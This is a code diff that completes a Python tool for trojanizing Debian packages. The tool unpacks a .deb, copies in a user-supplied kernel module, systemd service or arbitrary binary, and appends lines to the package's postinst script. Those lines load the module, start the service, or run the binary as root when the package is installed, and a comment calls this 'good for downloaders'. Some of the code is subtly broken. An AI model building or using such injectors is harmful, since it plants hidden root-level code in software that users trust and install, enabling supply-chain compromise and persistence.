@@ -4,6 +4,7 @@
 
 from datetime import datetime
 from os import chdir, getcwd, mkdir, system, walk
+from os.path import basename
 import sys
 
 #%% Getting things ready
@@ -25,7 +26,7 @@ class DebHandler:
     
     def unzip(self) -> tuple:
         """
-        Returns path to `preinst1, path to `postinst`, and the
+        Returns path to `preinst`, path to `postinst`, and the
         path to `data`.
         """
         mkdir(self.wdir)
@@ -55,6 +56,7 @@ class DebHandler:
         for file in files:
             if file.startswith("data.tar"):
                 ext = file.replace("data.tar", "", 1)
+                break
 
         match ext:
             case "":
@@ -156,11 +158,11 @@ class Logger:
 #    l.critical("Critical message")
 #    l.error("Segmentation Fault")
 
-
-#%% Execution
-
 h = DebHandler()
 l = Logger(debug=DEBUG)
+
+#%% argument handling (among other things)
+l.debug("Parsing arguments...")
 
 # confirming that files exists
 try:
@@ -179,15 +181,59 @@ except FileNotFoundError:
 if sys.argv[1].endswith(".ko"):
     # option 2
     # loading a kernel module.
-    pass
+    def ins_data(data_path, postinst_path):
+        mkdir("%s/lib/modules/" % (data_path))
+        system("cp %s %s/lib/modules" % (sys.argv[1], data_path))
+        with open(postinst_path, "a") as stream:
+            # since we don't know what kernel we'll be running, this
+            # is the best I can come up with to load the module.
+            # janky as best, but if you have a (reasonably acheivable)
+            # better idea, start a pr :)
+            stream.write(
+                "\nmv /lib/modules/%s /lib/modules/$(uname -r)/extra\n"
+                "modprobe /lib/modules/$(uname -r)/extra/%s\n"
+                % (basename(sys.argv[1]))
+            )
 
 elif sys.argv[1].endswith(".service"):
     # option 3
     # enabling and starting a service file.
-    pass
+    def ins_data(data_path, postinst_path):
+        mkdir("%s/etc/systemd/user" % (data_path))
+        system("cp %s %s/etc/systemd/user" % (sys.argv[1], data_path))
+        with open(postinst_path, "a") as stream:
+            stream.write(
+                "\nsystemctl enable /etc/systemd/user/%s\n" % (sys.argv[1])
+                "systemctl start /etc/systemd/user/%s" % (sys.argv[1])
+            )
 
 else:
     # option 1
-    # running a program as root
-    pass
+    # running a regular old program as root
+    # deletes the program after execution is complete
+    # good for downloaders
+    def ins_data(data_path, postinst_path):
+        mkdir("%s/tmp/1984ba647e97bf2cd70af" % (data_path))
+        system("cp %s %s/tmp/1984ba647e97bf2cd70af" % (sys.argv[1], data_path))
+        with open(postinst_path, "a") as stream:
+            stream.write(
+                "\n/tmp/1984ba647e97bf2cd70af/*\n"
+            )
+
+l.info("Starting execution")
+
+l.info("Unzipping file...")
+
+preinst, postinst, data = h.unzip()
+
+l.info("inserting new data")
+ins_data(data, postinst)
+
+l.info("Rezipping file...")
+new_file = h.rezip()
+
+system("mv %s ." % (new_file))
+l.info("New file is located at './%s'." % (basename(new_file)))
+
+l.warning("Enjoy!")
 
